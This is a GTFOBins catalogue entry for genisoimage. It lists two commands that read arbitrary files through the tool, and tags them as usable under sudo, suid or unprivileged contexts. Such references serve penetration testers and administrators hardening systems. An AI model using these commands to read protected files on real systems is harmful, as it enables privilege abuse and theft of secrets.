<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/genisoimage -->
---
functions:
  file-read:
  - code: |-
      genisoimage -q -o - /path/to/input-file
    comment: |-
      The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.
    contexts:
      sudo:
      suid:
      unprivileged:
  - code: |-
      genisoimage -sort /path/to/input-file
    comment: |-
      The file is parsed, and some of its content is disclosed by the error messages.
    contexts:
      sudo:
      suid:
      unprivileged:
...
